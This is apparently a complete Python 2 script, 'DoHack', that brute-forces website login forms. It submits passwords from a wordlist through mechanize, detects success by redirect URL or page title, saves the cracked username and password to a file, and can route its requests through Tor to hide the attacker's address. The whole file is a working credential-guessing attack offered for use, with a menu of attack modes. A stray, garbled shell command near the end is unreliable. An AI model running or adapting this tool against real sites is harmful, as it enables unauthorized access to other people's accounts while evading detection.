#!/usr/bin/env python
# -*- coding: utf-8 -*-

import mechanize
import sys
import os
import socks
import socket
import threading
import time
from mechanize import Browser

# styles
if sys.platform.lower() == "win32":
    os.system('color')

# Group of Different functions for different styles
class style():
    BLACK = lambda x: '\033[30m' + str(x)
    RED = lambda x: '\033[31m' + str(x)
    GREEN = lambda x: '\033[32m' + str(x)
    YELLOW = lambda x: '\033[33m' + str(x)
    BLUE = lambda x: '\033[34m' + str(x)
    MAGENTA = lambda x: '\033[35m' + str(x)
    CYAN = lambda x: '\033[36m' + str(x)
    WHITE = lambda x: '\033[37m' + str(x)
    UNDERLINE = lambda x: '\033[4m' + str(x)
    RESET = lambda x: '\033[0m' + str(x)

# End-styles

def runer():

    os.system("sudo service tor reload")
    SOCKS_PROXY_HOST = '127.0.0.1'
    SOCKS_PROXY_PORT = 9050


    def create_connection(address, timeout=None, source_address=None):
        sock = socks.socksocket()
        sock.connect(address)
        return sock

    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCKS_PROXY_HOST, SOCKS_PROXY_PORT)

    socket.socket = socks.socksocket
    socket.create_connection = create_connection
    brs = Browser()
    brs.set_handle_robots(False)
    response = brs.open('http://www.myexternalip.com/raw')
    ip =  response.read()
    print ("[DoH#] >>> now your using this ip  :" + ip)

def doHack(type,proxy = False):

    if (proxy == True):
        os.system("sudo service tor start")
        t1 = threading.Thread(target=runer)
        t1.start()
        t1.join()


    arr = dict();
    arr['website'] = raw_input('[DoH#] >>> Website Login page URL : ')
    arr['website_s'] = raw_input('[DoH#] >>> Website '+type+' URL after login successfully : ')
    arr['user'] = raw_input('[DoH#] >>> ID or Name of username input : ')
    arr['passw'] = raw_input('[DoH#] >>> ID or Name of password input : ')
    arr['email'] = raw_input("[DoH#] >>> Username or email : ")
    arr['file'] = raw_input('[DoH#] >>> wordlist file :')
    print("===================================================\n\n")
    with open(arr['file'],"r")as list:
            for line in list:
                word = line.strip()
                br = mechanize.Browser()
                br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                br.set_handle_robots(False)

                br.open(arr['website'])
                br.select_form(nr=0)
                br.form[arr['user']] =arr['email']
                br.form[arr['passw']]= word
                sub = br.submit()

                resultAfterSub =  type=="redirect" and sub.geturl() or ((type=="title") and br.title() or "CANCELE")
                if resultAfterSub == arr['website_s']:
                    print('==============================')

                    outputFile = os.path.expanduser("~/Desktop")+"/"+word+"-"+arr['email']+".log"
                    targetfilefound = open(outputFile, 'w')
                    targetfilefound.write('password: '+ word+'\n\n user: '+ arr['email'])
                    print(style.GREEN('[DoH#] >>> You will find the outputFile in:'+ outputFile +'\n'))
                    print(style.GREEN('[DoH#] >>> You will find the outputFile in:'+ outputFile +'\n'))
                    print (style.GREEN('[DoH#] >>> This is Target password ==> '+word+ '\n'))
                    print(style.RESET('=============================='))
                    exit()
                else:
                    print (style.RED('[DoH#] >>> This is not your  Password ==>'+word))

os.system("clear")
print ('''
===================================================================

   ╔═╗   ╔═╗┬    ──┐ ┌─┐┬ ┬┌─┐┌┐ ┬ ┬
   ╠═╣   ║╣ │ ───┌─┘ ├─┤├─┤├─┤├┴┐└┬┘  @  DoHack
   ╩ ╩ o ╚═╝┴─┘  └── ┴ ┴┴ ┴┴ ┴└─┘ ┴

   follow me in my instagram : •´¯`•.   🎀  [𝑒𝑔𝓎.𝒿𝓈]  🎀   .•`¯´•

   Build By A.ELZAHABY github.com/el3zahaby

===================================================================
''')
try:
    print ("1) To Start Attack using Redirect URL")
    print ("2) To Start Attack using Redirect URL + with Auto Proxy")
    print ("3) To Start Attack Using title of Website")
    print ("4) To Start Attack Using title of Website + with auto Proxy")
    choice = raw_input("[DoH#] >>> ")

    if choice == "1":

        doHack('redirect')

        print('[DoH#] >>> Sorry Password not found ')
    if choice == "2":

        doHack('redirect',True)

        print('[DoH#] >>> Sorry Password not found ')
    if choice =="3":

        doHack('title')

        print('[DoH#] >>> Sorry Password not found ')

    if choice =="4":

        doHack('title',True)

        print('[DoH#] >>> Sorry Password not found ')
    else:
        print("[DoH#] >>> sorry wrong choice Bye :) ")
    os.system('pdv -t %s % "(epoch_name)" > 123.txt')

except KeyboardInterrupt as e:
    print("EXIT")
    # quit
    sys.exit()
